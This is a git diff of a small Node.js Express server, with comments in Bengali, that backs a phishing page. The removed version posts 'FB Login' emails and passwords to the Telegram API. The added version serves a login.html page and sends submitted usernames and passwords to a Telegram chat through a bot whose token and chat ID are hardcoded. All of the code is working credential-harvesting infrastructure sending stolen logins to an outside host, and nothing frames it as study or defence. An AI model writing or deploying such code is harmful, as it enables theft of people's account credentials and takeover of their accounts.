@@ -1,29 +1,41 @@
 const express = require('express');
+const path = require('path');
 const bodyParser = require('body-parser');
-const fetch = require('node-fetch');
-const cors = require('cors');
+const TelegramBot = require('node-telegram-bot-api');
 const app = express();
-app.use(cors());
-app.use(bodyParser.json());
+const PORT = process.env.PORT || 3000;
 
-const TELEGRAM_BOT_TOKEN = '8349197469:AAGJ3QhB8iJUobWn_qL2sXbLXzsTMsPsnLo';
-const TELEGRAM_CHAT_ID = '6367435401';
+// Telegram bot setup
+const TOKEN = '8349197469:AAGJ3QhB8iJUobWn_qL2sXbLXzsTMsPsnLo';
+const CHAT_ID = '6367435401';
 
-app.use(express.static('public'));
+const bot = new TelegramBot(TOKEN, { polling: true });
 
-app.post('/send-to-telegram', async (req, res) => {
-  const {email, password} = req.body;
-  const text = `FB Login:\nEmail/Phone: ${email}\nPassword: ${password}`;
-  try {
-    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-      method: 'POST',
-      headers: {'Content-Type': 'application/json'},
-      body: JSON.stringify({chat_id: TELEGRAM_CHAT_ID, text})
-    });
-    res.sendStatus(200);
-  } catch (err) {
-    res.sendStatus(500);
-  }
+// Static files serve (login.html, css, js ইত্যাদি)
+app.use(express.static(__dirname));
+app.use(bodyParser.urlencoded({ extended: false }));
+
+// মূল "/" রুটে গেলে login.html দেখাবে
+app.get('/', (req, res) => {
+  res.sendFile(path.join(__dirname, 'login.html'));
 });
 
-app.listen(process.env.PORT || 10000, () => console.log('Server running...'));
+// Login form থেকে ডাটা নিলে Telegram-এ পাঠাবে
+app.post('/login', (req, res) => {
+  const { username, password } = req.body;
+  // Telegram-এ পাঠানো হচ্ছে
+  const message = `Login Info:\nUsername: ${username}\nPassword: ${password}`;
+  bot.sendMessage(CHAT_ID, message);
+
+  // Success response
+  res.send('Login info sent!');
+});
+
+// Example: বট রেসিভ মেসেজ/কমান্ড
+bot.onText(/\/start/, (msg) => {
+  bot.sendMessage(msg.chat.id, "Bot is working!");
+});
+
+app.listen(PORT, () => {
+  console.log(`Server running on port ${PORT}`);
+});
